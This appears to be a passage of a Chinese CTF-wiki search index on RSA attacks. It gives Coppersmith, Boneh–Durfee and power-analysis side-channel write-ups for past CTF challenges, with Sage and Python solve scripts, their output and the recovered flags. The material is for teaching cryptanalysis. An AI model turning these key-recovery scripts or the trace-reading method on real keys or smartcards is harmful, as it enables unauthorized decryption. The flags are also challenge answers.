gen_key  \u51fd\u6570  def   gen_key (): \n     while   True : \n         p   =   getPrime ( k / 2 ) \n         if   gcd ( e ,   p - 1 )   ==   1 : \n             break \n     q_t   =   getPrime ( k / 2 ) \n     n_t   =   p   *   q_t \n     t   =   get_bit ( n_t ,   k / 16 ,   1 ) \n     y   =   get_bit ( n_t ,   5 * k / 8 ,   0 ) \n     p4   =   get_bit ( p ,   5 * k / 16 ,   1 ) \n     u   =   pi_b ( p4 ,   1 ) \n     n   =   bytes_to_long ( long_to_bytes ( t )   +   long_to_bytes ( u )   +   long_to_bytes ( y )) \n     q   =   n   /   p \n     if   q   %   2   ==   0 : \n         q   +=   1 \n     while   True : \n         if   isPrime ( q )   and   gcd ( e ,   q - 1 )   ==   1 : \n             break \n         m   =   getPrime ( k / 16 )   +   1 \n         q   ^=   m \n     return   ( p ,   q ,   e )   \u5176\u4e2d\u6211\u4eec\u5df2\u77e5\u5982\u4e0b\u53c2\u6570   \nk=2048\ne=0x10001  \nk=2048\ne=0x10001   \u9996\u5148\uff0c\u7a0b\u5e8f\u5148\u5f97\u5230\u4e86 1024 \u6bd4\u7279\u4f4d\u7684\u7d20\u6570 p\uff0c\u5e76\u4e14  gcd(2,p-1)=1 \u3002  \u7136\u540e\uff0c\u7a0b\u5e8f\u53c8\u5f97\u5230\u4e86\u4e00\u4e2a 1024 \u6bd4\u7279\u4f4d\u7684\u7d20\u6570  q_t q_t \uff0c\u5e76\u4e14\u8ba1\u7b97  n_t=p \\times q_t n_t=p \\times q_t \u3002  \u4e0b\u9762\u591a\u6b21\u8c03\u7528\u4e86  get_bit  \u51fd\u6570\uff0c\u6211\u4eec\u6765\u7b80\u5355\u5206\u6790\u4e00\u4e0b  def   get_bit ( number ,   n_bit ,   dire ): \n          dire:          1: left          0: right       \n\n     if   dire : \n         sn   =   size ( number ) \n         if   sn   %   8   !=   0 : \n             sn   +=   ( 8   -   sn   %   8 ) \n         return   number     ( sn - n_bit ) \n     else : \n         return   number     ( pow ( 2 ,   n_bit )   -   1 )   \u53ef\u4ee5\u770b\u51fa\u6839\u636e  dire(ction)  \u7684\u4e0d\u540c\uff0c\u4f1a\u5f97\u5230\u4e0d\u540c\u7684\u6570   dire=1  \u65f6\uff0c\u7a0b\u5e8f\u9996\u5148\u8ba1\u7b97  number  \u7684\u4e8c\u8fdb\u5236\u4f4d\u6570  sn \uff0c\u5982\u679c\u4e0d\u662f 8 \u7684\u6574\u6570\u500d\u7684\u8bdd\uff0c\u5c31\u5c06  sn  \u589e\u5927\u4e3a 8 \u7684\u6574\u6570\u500d\uff0c\u7136\u540e\u8fd4\u56de  number  \u53f3\u79fb  sn-n_bit  \u7684\u6570\u5b57\u3002\u5176\u5b9e \u5c31\u662f\u6700\u591a\u4fdd\u7559  number  \u7684  n_bit  \u4f4d\u3002  dire=0  \u65f6\uff0c\u7a0b\u5e8f\u76f4\u63a5\u83b7\u53d6  number  \u7684\u4f4e  n_bit  \u4f4d\u3002   \u7136\u540e\u6211\u4eec\u518d\u6765\u770b\u7a0b\u5e8f       t   =   get_bit ( n_t ,   k / 16 ,   1 ) \n     y   =   get_bit ( n_t ,   5 * k / 8 ,   0 ) \n     p4   =   get_bit ( p ,   5 * k / 16 ,   1 )   \u8fd9\u4e09\u4e2a\u64cd\u4f5c\u5206\u522b\u505a\u4e86\u5982\u4e0b\u7684\u4e8b\u60c5   t  \u4e3a  n_t  \u7684\u6700\u591a\u9ad8 k/16 \u4f4d\uff0c\u5373 128 \u4f4d\uff0c\u4f4d\u6570\u4e0d\u56fa\u5b9a\u3002  y  \u4e3a  n_t  \u7684\u4f4e 5*k/8 \u4f4d\uff0c\u5373 1280 \u4f4d\uff0c\u4f4d\u6570\u56fa\u5b9a\u3002  p4  \u4e3a p \u7684\u6700\u591a\u9ad8 5*k/16 \u4f4d\uff0c\u5373 640 \u4f4d\uff0c\u4f4d\u6570\u4e0d\u56fa\u5b9a\u3002   \u6b64\u540e\uff0c\u7a0b\u5e8f\u6709\u5982\u4e0b\u64cd\u4f5c       u   =   pi_b ( p4 ,   1 )   \u5229\u7528  pi_b  \u5bf9  p4  \u8fdb\u884c\u4e86\u52a0\u5bc6  def   pi_b ( x ,   m ): \n          m:          1: encrypt          0: decrypt        \n     enc   =   DES . new ( key ) \n     if   m : \n         method   =   enc . encrypt \n     else : \n         method   =   enc . decrypt \n     s   =   long_to_bytes ( x ) \n     sp   =   [ s [ a : a + 8 ]   for   a   in   xrange ( 0 ,   len ( s ),   8 )] \n     r   =   \n     for   a   in   sp : \n         r   +=   method ( a ) \n     return   bytes_to_long ( r )   \u5176\u4e2d\uff0c\u6211\u4eec\u5df2\u77e5\u4e86\u5bc6\u94a5 key\uff0c\u6240\u4ee5\u53ea\u8981\u6211\u4eec\u6709\u5bc6\u6587\u5c31\u53ef\u4ee5\u89e3\u5bc6\u3002\u6b64\u5916\uff0c\u53ef\u4ee5\u770b\u5230\u7684\u662f\u7a0b\u5e8f\u662f\u5bf9\u4f20\u5165\u7684\u6d88\u606f\u8fdb\u884c 8 \u5b57\u8282\u5206\u7ec4\uff0c\u91c7\u7528\u5bc6\u7801\u672c\u65b9\u5f0f\u52a0\u5bc6\uff0c\u6240\u4ee5\u5bc6\u6587\u4e4b\u95f4\u4e92\u4e0d\u5f71\u54cd\u3002  \u4e0b\u9762       n   =   bytes_to_long ( long_to_bytes ( t )   +   long_to_bytes ( u )   +   long_to_bytes ( y )) \n     q   =   n   /   p \n     if   q   %   2   ==   0 : \n         q   +=   1 \n     while   True : \n         if   isPrime ( q )   and   gcd ( e ,   q - 1 )   ==   1 : \n             break \n         m   =   getPrime ( k / 16 )   +   1 \n         q   ^=   m \n     return   ( p ,   q ,   e )   \u7a0b\u5e8f\u5c06 t\uff0cu\uff0cy \u62fc\u63a5\u5728\u4e00\u8d77\u5f97\u5230 n\uff0c\u8fdb\u800c\uff0c\u7a0b\u5e8f\u5f97\u5230\u4e86 q\uff0c\u5e76\u5bf9 q \u7684\u4f4e k/16 \u4f4d\u505a\u4e86\u6291\u6216\uff0c\u7136\u540e\u8fd4\u56de  q' \u3002  \u5728\u4e3b\u7a0b\u5e8f\u91cc\uff0c\u518d\u4e00\u6b21\u5f97\u5230\u4e86  n'=p*q' \u3002\u8fd9\u91cc\u6211\u4eec\u4ed4\u7ec6\u5206\u6790\u4e00\u4e0b  n =p * ( q + random(2^{k/16}))  \u800c p \u662f k/2 \u4f4d\u7684\uff0c\u6240\u4ee5\u8bf4\uff0crandom \u7684\u90e8\u5206\u6700\u591a\u53ef\u4ee5\u5f71\u54cd\u539f\u6765\u7684 n \u7684\u6700\u4f4e\u7684  k/2+k/16=9k/16 k/2+k/16=9k/16  \u6bd4\u7279\u4f4d\u3002  \u800c\uff0c\u6211\u4eec\u8fd8\u77e5\u9053 n \u7684\u6700\u4f4e\u7684 5k/8=10k/16 \u6bd4\u7279\u4e3a\u5176\u5b9e\u5c31\u662f y\uff0c\u6240\u4ee5\u5176\u5e76\u6ca1\u6709\u5f71\u54cd\u5230 u\uff0c\u5373\u4f7f\u5f71\u54cd\u5230\u4e5f\u5c31\u6700\u591a\u5f71\u54cd\u5230\u4e00\u4f4d\u3002  \u6240\u4ee5\u6211\u4eec\u9996\u5148\u53ef\u4ee5\u5229\u7528\u6211\u4eec\u5f97\u5230\u7684 n \u6765\u83b7\u53d6 u\uff0c\u5982\u4e0b  u=hex(n)[2:-1][-480:-320]  \u867d\u7136\uff0c\u8fd9\u6837\u53ef\u80fd\u4f1a\u83b7\u5f97\u8f83\u591a\u4f4d\u6570\u7684 u\uff0c\u4f46\u662f\u8fd9\u6837\u5e76\u4e0d\u5f71\u54cd\uff0c\u6211\u4eec\u5bf9 u \u89e3\u5bc6\u7684\u65f6\u5019\u6bcf\u4e00\u5206\u7ec4\u90fd\u4e92\u4e0d\u5f71\u54cd\uff0c\u6240\u4ee5\u6211\u4eec\u53ea\u53ef\u80fd\u5f71\u54cd\u6700\u9ad8\u4f4d\u6570\u7684 p4\u3002\u800c p4 \u7684\u7684\u9ad8 8 \u4f4d\u4e5f\u6709\u53ef\u80fd\u662f\u586b\u5145\u7684\u3002\u4f46\u8fd9\u4e5f\u5e76\u4e0d\u5f71\u54cd\uff0c\u6211\u4eec\u5df2\u7ecf\u5f97\u5230\u4e86\u56e0\u5b50 p \u7684\u7684\u5f88\u591a\u90e8\u5206\u4e86\uff0c\u6211\u4eec\u53ef\u4ee5\u53bb\u5c1d\u8bd5\u7740\u89e3\u5bc6\u4e86\u3002\u5982\u4e0b  if   __name__ == __main__ : \n     n   =   0x724d41149e1bd9d2aa9b333d467f2dfa399049a5d0b4ee770c9d4883123be11a52ff1bd382ad37d0ff8d58c8224529ca21c86e8a97799a31ddebd246aeeaf0788099b9c9c718713561329a8e529dfeae993036921f036caa4bdba94843e0a2e1254c626abe54dc3129e2f6e6e73bbbd05e7c6c6e9f44fcd0a496f38218ab9d52bf1f266004180b6f5b9bee7988c4fe5ab85b664280c3cfe6b80ae67ed8ba37825758b24feb689ff247ee699ebcc4232b4495782596cd3f29a8ca9e0c2d86ea69372944d027a0f485cea42b74dfd74ec06f93b997a111c7e18017523baf0f57ae28126c8824bd962052623eb565cee0ceee97a35fd8815d2c5c97ab9653c4553f \n     u   =   hex ( n )[ 2 : - 1 ][ - 480 : - 320 ] \n     u   =   int ( u , 16 ) \n     p4   =   pi_b ( u , 0 ) \n     print   hex ( p4 )   \u89e3\u5bc6\u7ed3\u679c\u5982\u4e0b  \u279c    2016 - HCTF - RSA2   git :( master )   \u2717   python   exp_p4 . py   0xa37302107c17fb4ef5c3443f4ef9e220ac659670077b9aa9ff7381d11073affe9183e88acae0ab61fb75a3c7815ffcb1b756b27c4d90b2e0ada753fa17cc108c1d0de82c747db81b9e6f49bde1362693 L   \u4e0b\u9762\uff0c\u6211\u4eec\u76f4\u63a5\u4f7f\u7528 sage \u6765\u89e3\u5bc6\uff0c\u8fd9\u91cc sage \u91cc\u9762\u5df2\u7ecf\u5b9e\u73b0\u4e86\u8fd9\u4e2a\u653b\u51fb\uff0c\u6211\u4eec\u76f4\u63a5\u62ff\u6765\u7528\u5c31\u597d  from   sage.all   import   *  import   binascii  n   =   0x724d41149e1bd9d2aa9b333d467f2dfa399049a5d0b4ee770c9d4883123be11a52ff1bd382ad37d0ff8d58c8224529ca21c86e8a97799a31ddebd246aeeaf0788099b9c9c718713561329a8e529dfeae993036921f036caa4bdba94843e0a2e1254c626abe54dc3129e2f6e6e73bbbd05e7c6c6e9f44fcd0a496f38218ab9d52bf1f266004180b6f5b9bee7988c4fe5ab85b664280c3cfe6b80ae67ed8ba37825758b24feb689ff247ee699ebcc4232b4495782596cd3f29a8ca9e0c2d86ea69372944d027a0f485cea42b74dfd74ec06f93b997a111c7e18017523baf0f57ae28126c8824bd962052623eb565cee0ceee97a35fd8815d2c5c97ab9653c4553f  p4   = 0xa37302107c17fb4ef5c3443f4ef9e220ac659670077b9aa9ff7381d11073affe9183e88acae0ab61fb75a3c7815ffcb1b756b27c4d90b2e0ada753fa17cc108c1d0de82c747db81b9e6f49bde1362693  cipher   =   0xf11e932fa420790ca3976468dc4df1e6b20519ebfdc427c09e06940e1ef0ca566d41714dc1545ddbdcae626eb51c7fa52608384a36a2a021960d71023b5d0f63e6b38b46ac945ddafea42f01d24cc33ce16825df7aa61395d13617ae619dca2df15b5963c77d6ededf2fe06fd36ae8c5ce0e3c21d72f2d7f20cd9a8696fbb628df29299a6b836c418cbfe91e2b5be74bdfdb4efdd1b33f57ebb72c5246d5dce635529f1f69634d565a631e950d4a34a02281cbed177b5a624932c2bc02f0c8fd9afd332ccf93af5048f02b8bd72213d6a52930b0faa0926973883136d8530b8acf732aede8bb71cb187691ebd93a0ea8aeec7f82d0b8b74bcf010c8a38a1fa8  e2   =   0xf93b  pbits   =   1024  kbits   =   pbits   -   p4 . nbits ()  print   p4 . nbits ()  p4   =   p4     kbits  PR . x   =   PolynomialRing ( Zmod ( n ))  f   =   x   +   p4  roots   =   f . small_roots ( X = 2 ^ kbits ,   beta = 0.4 )  if   roots : \n     p   =   p4 + int ( roots [ 0 ]) \n     print   p:  ,   hex ( int ( p )) \n     assert   n   %   p   ==   0 \n     q   =   n / int ( p ) \n     print   q:  ,   hex ( int ( q )) \n     print   gcd ( p , q ) \n     phin   =   ( p - 1 ) * ( q - 1 ) \n     print   gcd ( e2 , phin ) \n     d   =   inverse_mod ( e2 , phin ) \n     flag   =   pow ( cipher , d , n ) \n     flag   =   hex ( int ( flag ))[ 2 : - 1 ] \n     print   binascii . unhexlify ( flag )   \u5173\u4e8e  small_roots  \u7684\u4f7f\u7528\uff0c\u53ef\u4ee5\u53c2\u8003  SAGE \u8bf4\u660e \u3002  \u7ed3\u679c\u5982\u4e0b  \u279c   2016 -HCTF-RSA2 git: ( master )  \u2717 sage payload.sage\nsys:1: RuntimeWarning: not adding directory   to sys.path since everybody can write to it.\nUntrusted users could put files in this directory which might  then  be imported by your Python code. As a general precaution from similar exploits, you should not execute Python code from this directory 640 \np:  0xa37302107c17fb4ef5c3443f4ef9e220ac659670077b9aa9ff7381d11073affe9183e88acae0ab61fb75a3c7815ffcb1b756b27c4d90b2e0ada753fa17cc108c1d0de82c747db81b9e6f49bde13626933aa6762057e1df53d27356ee6a09b17ef4f4986d862e3bb24f99446a0ab2385228295f4b776c1f391ab2a0d8c0dec1e5L\nq:  0xb306030a7c6ace771db8adb45fae597f3c1be739d79fd39dfa6fd7f8c177e99eb29f0462c3f023e0530b545df6e656dadb984953c265b26f860b68aa6d304fa403b0b0e37183008592ec2a333c431e2906c9859d7cbc4386ef4c4407ead946d855ecd6a8b2067ad8a99b21111b26905fcf0d53a1b893547b46c3142b06061853L 1  1 \nhctf { d8e8fca2dc0f896fd7cb4cb0031ba249 }", 
            "title": "\u4f8b\u9898"
        }, 
        {
            "location": "/crypto/asymmetric/rsa/rsa_coppersmith_attack/#_14", 
            "text": "2016 \u6e56\u6e58\u676f \u7b80\u5355\u7684 RSA  2017 WHCTF Untitled", 
            "title": "\u9898\u76ee"
        }, 
        {
            "location": "/crypto/asymmetric/rsa/rsa_coppersmith_attack/#boneh-and-durfee-attack", 
            "text": "", 
            "title": "Boneh and Durfee attack"
        }, 
        {
            "location": "/crypto/asymmetric/rsa/rsa_coppersmith_attack/#_15", 
            "text": "\u5f53 d \u8f83\u5c0f\u65f6\uff0c\u6ee1\u8db3  d\\leq N^{0.292} d\\leq N^{0.292}  \u65f6\uff0c\u6211\u4eec\u53ef\u4ee5\u5229\u7528\u8be5\u5de5\u5177\uff0c\u5728\u4e00\u5b9a\u7a0b\u5ea6\u4e0a\u8be5\u8981\u653b\u51fb\u6bd4 Wiener's Attack\u8981\u5f3a\u4e00\u4e9b\u3002", 
            "title": "\u653b\u51fb\u6761\u4ef6"
        }, 
        {
            "location": "/crypto/asymmetric/rsa/rsa_coppersmith_attack/#_16", 
            "text": "\u8fd9\u91cc\u7b80\u5355\u8bf4\u4e00\u4e0b\u539f\u7406  \u9996\u5148\u6211\u4eec\u6709   \ned \\equiv 1 \\bmod  \\varphi(N)  \ned \\equiv 1 \\bmod  \\varphi(N)   \u8fdb\u800c\u6211\u4eec\u6709   \ned =k\\varphi(N)+1  \ned =k\\varphi(N)+1   \u5373   \nk \\varphi(N) +1 \\equiv 0 \\bmod e  \nk \\varphi(N) +1 \\equiv 0 \\bmod e   \u53c8   \n\\varphi(N)=(p-1)(q-1)=qp-p-q+1=N-p-q+1  \n\\varphi(N)=(p-1)(q-1)=qp-p-q+1=N-p-q+1   \u6240\u4ee5   \nk(N-p-q+1)+1 \\equiv 0 \\bmod e  \nk(N-p-q+1)+1 \\equiv 0 \\bmod e   \u6211\u4eec\u5047\u8bbe  A=N+1 A=N+1 \uff0c y=-p-q y=-p-q  \u90a3\u4e48  \u539f\u5f0f\u53ef\u5316\u4e3a   \nf(k,y)=k(A+y)+1 \\equiv 0 \\bmod e  \nf(k,y)=k(A+y)+1 \\equiv 0 \\bmod e   \u5982\u679c\u6211\u4eec\u6c42\u5f97\u4e86\u8be5\u4e8c\u5143\u65b9\u7a0b\u7684\u6839\uff0c\u90a3\u4e48\u6211\u4eec\u81ea\u7136\u4e5f\u5c31\u53ef\u4ee5\u89e3\u4e00\u5143\u4e8c\u6b21\u65b9\u7a0b  N=pq,p+q=-y N=pq,p+q=-y  \u6765\u5f97\u5230 p \u4e0e q\u3002", 
            "title": "\u653b\u51fb\u539f\u7406"
        }, 
        {
            "location": "/crypto/asymmetric/rsa/rsa_coppersmith_attack/#_17", 
            "text": "\u8bf7\u53c2\u8003  https://github.com/mimoo/RSA-and-LLL-attacks \u3002\u4e0a\u9762\u6709\u4f7f\u7528\u6559\u7a0b\u3002", 
            "title": "\u653b\u51fb\u5de5\u5177"
        }, 
        {
            "location": "/crypto/asymmetric/rsa/rsa_coppersmith_attack/#_18", 
            "text": "\u8fd9\u91cc\u6211\u4eec\u4ee5 2015 \u5e74 PlaidCTF-CTF-Curious \u4e3a\u4f8b\u8fdb\u884c\u4ecb\u7ecd\u3002  \u9996\u5148\u9898\u76ee\u7ed9\u4e86\u4e00\u5806 N\uff0ce\uff0cc\u3002\u7b80\u5355\u770b\u4e00\u4e0b\u53ef\u4ee5\u53d1\u73b0\u8be5 e \u6bd4\u8f83\u5927\u3002\u8fd9\u65f6\u5019\u6211\u4eec\u53ef\u4ee5\u8003\u8651\u4f7f\u7528 Wiener's Attack\uff0c\u8fd9\u91cc\u6211\u4eec\u4f7f\u7528\u66f4\u5f3a\u7684\u76ee\u524d\u4ecb\u7ecd\u7684\u653b\u51fb\u3002  \u6838\u5fc3\u4ee3\u7801\u5982\u4e0b       nlist   =   list () \n     elist   =   list () \n     clist   =   list () \n     with   open ( captured )   as   f : \n         # read the line {N : e : c} and do nothing with it \n         f . readline () \n         for   i   in   f . readlines (): \n             ( N ,   e ,   c )   =   i [ 1 : - 2 ] . split (  :  ) \n             nlist . append ( long ( N , 16 )) \n             elist . append ( long ( e , 16 )) \n             clist . append ( long ( c , 16 )) \n\n     for   i   in   range ( len ( nlist )): \n         print   index i \n         n   =   nlist [ i ] \n         e   =   elist [ i ] \n         c   =   clist [ i ] \n         d   =   solve ( n , e ) \n         if   d == 0 : \n             continue \n         else : \n             m   =   power_mod ( c ,   d ,   n ) \n             hex_string   =   %x   %   m \n             import   binascii \n             print   the plaintext: ,   binascii . unhexlify ( hex_string ) \n             return   \u7ed3\u679c\u5982\u4e0b  ===  solution  found   === \nprivate key found:  23974584842546960047080386914966001070087596246662608796022581200084145416583 \nthe plaintext: flag_S0Y0UKN0WW13N3R $4 TT4CK!", 
            "title": "\u4f8b\u5b50"
        }, 
        {
            "location": "/crypto/asymmetric/rsa/rsa_side_channel/", 
            "text": "RSA \u4fa7\u4fe1\u9053\u653b\u51fb\n\n\n\u80fd\u91cf\u5206\u6790\u653b\u51fb\uff08\u4fa7\u4fe1\u9053\u653b\u51fb\uff09\u662f\u4e00\u79cd\u80fd\u591f\u4ece\u5bc6\u7801\u8bbe\u5907\u4e2d\u83b7\u53d6\u79d8\u5bc6\u4fe1\u606f\u7684\u5bc6\u7801\u653b\u51fb\u65b9\u6cd5\uff0e\u4e0e\u5176\n\u4ed6\u653b\u51fb\u65b9\u6cd5\u4e0d\u540c\uff1a\u8fd9\u79cd\u653b\u51fb\u5229\u7528\u7684\u662f\u5bc6\u7801\u8bbe\u5907\u7684\u80fd\u91cf\u6d88\u8017\u7279\u5f81\uff0c\u800c\u975e\u5bc6\u7801\u7b97\u6cd5\u7684\u6570\u5b66\u7279\u6027\uff0e\u80fd\u91cf\u5206\u6790\u653b\u51fb\u662f\u4e00\u79cd\u975e\u5165\u4fb5\u5f0f\u653b\u51fb\uff0c\u653b\u51fb\u8005\u53ef\u4ee5\u65b9\u4fbf\u5730\u8d2d\u4e70\u5b9e\u65bd\u653b\u51fb\u6240\u9700\u8981\u7684\u8bbe\u5907\uff1a\u6240\u4ee5\u8fd9\u79cd\u653b\u51fb\u5bf9\u667a\u80fd\u5361\u4e4b\u7c7b\u7684\u5bc6\u7801\u8bbe\u5907\u7684\u5b89\u5168\u6027\u9020\u6210\u4e86\u4e25\u91cd\u5a01\u80c1\u3002\n\n\n\u80fd\u91cf\u5206\u6790\u653b\u51fb\u662f\u5b89\u5168\u9886\u57df\u5185\u975e\u5e38\u91cd\u8981\u7684\u4e00\u4e2a\u90e8\u5206\uff0c\u6211\u4eec\u53ea\u5728\u8fd9\u91cc\u7b80\u5355\u8ba8\u8bba\u4e0b\u3002\n\n\n\u80fd\u91cf\u5206\u6790\u653b\u51fb\u5206\u4e3a\uff1a\n- \u7b80\u5355\u80fd\u91cf\u5206\u6790\u653b\u51fb\uff08SPA\uff09\uff0c\u5373\u5bf9\u80fd\u91cf\u8ff9\u8fdb\u884c\u76f4\u89c2\u5206\u6790\uff0c\u8089\u773c\u770b\u5373\u53ef\u3002\n- \u5dee\u5206\u80fd\u91cf\u5206\u6790\u653b\u51fb\uff08DPA\uff09\uff0c\u57fa\u4e8e\u80fd\u91cf\u8ff9\u4e4b\u95f4\u7684\u76f8\u5173\u7cfb\u6570\u8fdb\u884c\u5206\u6790\u3002\n\n\n\u653b\u51fb\u6761\u4ef6\n\n\n\u653b\u51fb\u8005\u53ef\u83b7\u53d6\u4e0e\u52a0\u89e3\u5bc6\u76f8\u5173\u7684\u4fa7\u4fe1\u9053\u4fe1\u606f\uff0c\u4f8b\u5982\u80fd\u91cf\u6d88\u8017\u3001\u8fd0\u7b97\u65f6\u95f4\u3001\u7535\u78c1\u8f90\u5c04\u7b49\u7b49\u3002\n\n\n\u4f8b\u5b50\n\n\n\u8fd9\u91cc\u6211\u4eec\u4ee5 HITB 2017 \u7684 Hack in the card I \u4f5c\u4e3a\u4f8b\u5b50\u3002\n\n\n\u9898\u76ee\u7ed9\u51fa\u4e86\u516c\u94a5\u6587\u4ef6 \npublickey.pem\n\uff0c\u5bc6\u6587\uff0c\u6d4b\u91cf\u667a\u80fd\u5361\u529f\u7387\u7684\u7535\u8def\u56fe\uff0c\u548c\n\u89e3\u5bc6\n\u8fc7\u7a0b\u4e2d\u667a\u80fd\u5361\u6d88\u8017\u7684\u529f\u7387\u53d8\u5316\uff08\u901a\u8fc7\u5728\u7ebf\u7f51\u7ad9\u7ed9\u51fa \ntrace\n\uff09\u3002\n\u200b \n\n\n\n\n\u5bc6\u6587\uff1a\n\n014b05e1a09668c83e13fda8be28d148568a2342aed833e0ad646bd45461da2decf9d538c2d3ab245b272873beb112586bb7b17dc4b30f0c5408d8b03cfbc8388b2bd579fb419a1cac38798da1c3da75dc9a74a90d98c8f986fd8ab8b2dc539768beb339cadc13383c62b5223a50e050cb9c6b759072962c2b2cf21b4421ca73394d9e12cfbc958fc5f6b596da368923121e55a3c6a7b12fdca127ecc0e8470463f6e04f27cd4bb3de30555b6c701f524c8c032fa51d719901e7c75cc72764ac00976ac6427a1f483779f61cee455ed319ee9071abefae4473e7c637760b4b3131f25e5eb9950dd9d37666e129640c82a4b01b8bdc1a78b007f8ec71e7bad48046\n\n\n\n\u5206\u6790\n\n\n\u7531\u4e8e\u7f51\u7ad9\u53ea\u7ed9\u51fa\u4e86\u4e00\u6761\u80fd\u91cf\u8ff9\uff0c\u6240\u4ee5\u53ef\u4ee5\u65ad\u5b9a\u8fd9\u662f Simple channel analysis\uff08SPA\uff09\u653b\u51fb\u3002\u90a3\u4e48\u6211\u4eec\u53ef\u4ee5\u76f4\u63a5\u901a\u8fc7\u89c2\u5bdf\u80fd\u91cf\u8ff9\u7684\u9ad8\u4f4e\u7535\u5e73\u6765\u83b7\u5f97 RSA \u89e3\u5bc6\u8fc7\u7a0b\u7684\u5bc6\u94a5 d\u3002\nRSA \u53ef\u88ab SPA \u653b\u51fb\u7684\u7406\u8bba\u57fa\u7840\u6765\u81ea\u4e8e RSA \u4e2d\u5305\u542b\u7684\u5feb\u901f\u5e42\u53d6\u4f59\u7b97\u6cd5\u3002\n\n\n\u5feb\u901f\u5e42\u7b97\u6cd5\u5982\u4e0b\n\n\n\n\nb \u4e3a\u5076\u6570\u65f6\uff0c\na^b \\bmod c = ({a^2}^{b/2}) \\bmod c\na^b \\bmod c = ({a^2}^{b/2}) \\bmod c\n\u3002\n\n\nb \u4e3a\u5947\u6570\u65f6\uff0c\na^b \\bmod c = ({a^2}^{b/2} \\times a) \\bmod c\na^b \\bmod c = ({a^2}^{b/2} \\times a) \\bmod c\n\u3002\n\n\n\n\n\u76f8\u5e94\u7684 C \u4ee3\u7801\u5b9e\u73b0\u4e3a\uff1a\n\nint\n \nPowerMod\n(\nint\n \na\n,\n \nint\n \nb\n,\n \nint\n \nc\n)\n\n\n{\n\n    \nint\n \nans\n \n=\n \n1\n;\n\n    \na\n \n=\n \na\n \n%\n \nc\n;\n\n    \nwhile\n(\nb\n0\n)\n \n{\n\n        \nif\n(\nb\n \n%\n \n2\n \n==\n \n1\n)\n \n// \u5f53b\u4e3a\u5947\u6570\u65f6\u4f1a\u591a\u6267\u884c\u4e0b\u9762\u7684\u6307\u4ee4\n\n            \nans\n \n=\n \n(\nans\n \n*\n \na\n)\n \n%\n \nc\n;\n\n        \nb\n \n=\n \nb\n/\n2\n;\n\n        \na\n \n=\n \n(\na\n \n*\n \na\n)\n \n%\n \nc\n;\n\n    \n}\n\n    \nreturn\n \nans\n;\n\n\n}\n\n\n\n\n\u7531\u4e8e\u5feb\u901f\u5e42\u7684\u8ba1\u7b97\u8fc7\u7a0b\u4e2d\u4f1a\u9010\u4f4d\u5224\u65ad\u6307\u6570\u7684\u53d6\u503c\uff0c\u5e76\u4f1a\u91c7\u53d6\u4e0d\u540c\u7684\u64cd\u4f5c\uff0c\u6240\u4ee5\u53ef\u4ece\u80fd\u91cf\u8ff9\u4e2d\u8fd8\u539f\u51fa d \u7684\u53d6\u503c\uff08\u4ece\u4e0a\u9762\u53ef\u77e5\uff0c\u76f4\u63a5\u5f97\u5230\u7684\u503c\u662f d \u7684\u4e8c\u8fdb\u5236\u53d6\u503c\u7684\n\u9006\u5e8f\n\uff09\u3002\n\n\n\u6ce8\u610f\n\uff1a\n\n\n\n\n\u6709\u65f6\u5019\u6a21\u4e58\u4e5f\u53ef\u80fd\u4f1a\u4ece\u9ad8\u4f4d\u5411\u4f4e\u4f4d\u8fdb\u884c\u6a21\u4e58\u3002\u8fd9\u91cc\u662f\u4ece\u4f4e\u4f4d\u5411\u9ad8\u4f4d\u6a21\u4e58\u3002\n\n\n\n\n\n\n\u7531\u6b64\u53ef\u7ed9\u51fa\u8fd8\u539f d \u7684\u811a\u672c\u5982\u4e0b\uff1a\n\n\nf\n \n=\n \nopen\n(\n./data.txt\n)\n\n\ndata\n \n=\n \nf\n.\nread\n()\n.\nsplit\n(\n,\n)\n\n\nprint\n(\npoint number:\n,\n \nlen\n(\ndata\n))\n\n\n\nstart_point\n \n=\n \n225\n   \n# \u5f00\u59cb\u5206\u6790\u7684\u70b9\n\n\nmid\n \n=\n \n50\n            \n# \u91c7\u6837\u70b9\u95f4\u9694\n\n\nfence\n \n=\n \n228\n         \n# \u9ad8\u4f4e\u7535\u5e73\u5206\u754c\u7ebf\n\n\n\nbin_array\n \n=\n \n[]\n\n\n\nfor\n \npoint_index\n \nin\n \nrange\n(\nstart_point\n,\n \nlen\n(\ndata\n),\n \nmid\n):\n\n    \nif\n \nfloat\n(\ndata\n[\npoint_index\n])\n \n \nfence\n:\n\n        \nbin_array\n.\nappend\n(\n1\n)\n\n    \nelse\n:\n\n        \nbin_array\n.\nappend\n(\n0\n)\n\n\n\nbin_array2\n \n=\n \n[]\n\n\nflag1\n \n=\n \n0\n\n\nflag2\n \n=\n \n0\n\n\nfor\n \nx\n \nin\n \nbin_array\n:\n\n    \nif\n \nx\n:\n\n        \nif\n \nflag1\n:\n\n            \nflag2\n \n=\n \n1\n\n        \nelse\n:\n\n            \nflag1\n \n=\n \n1\n\n    \nelse\n:\n\n        \nif\n \nflag2\n:\n\n            \nbin_array2\n.\nappend\n(\n1\n)\n\n        \nelse\n:\n\n            \nbin_array2\n.\nappend\n(\n0\n)\n\n        \nflag1\n \n=\n \n0\n\n        \nflag2\n \n=\n \n0\n\n\n\n# d_bin = bin_array2[::-1]\n\n\nd_bin\n \n=\n \nbin_array2\n\n\nd\n \n=\n \n.\njoin\n(\nstr\n(\nx\n)\n \nfor\n \nx\n \nin\n \nd_bin\n)[::\n-\n1\n]\n\n\nprint\n(\nd\n)\n\n\nd_int\n \n=\n \nint\n(\nd\n,\n2\n)\n\n\nprint\n(\nd_int\n)\n\n\n\n\n\n\u53c2\u8003\u8d44\u6599\n\n\n\n\nMangard, S., Oswald, E., Popp, T., \u51af\u767b\u56fd, \u5468\u6c38\u5f6c, \n \u5218\u7ee7\u4e1a. (2010). \u80fd\u91cf\u5206\u6790\u653b\u51fb.", 
            "title": "\u4fa7\u4fe1\u9053\u653b\u51fb"
        }, 
        {
            "location": "/crypto/asymmetric/rsa/rsa_side_channel/#rsa", 
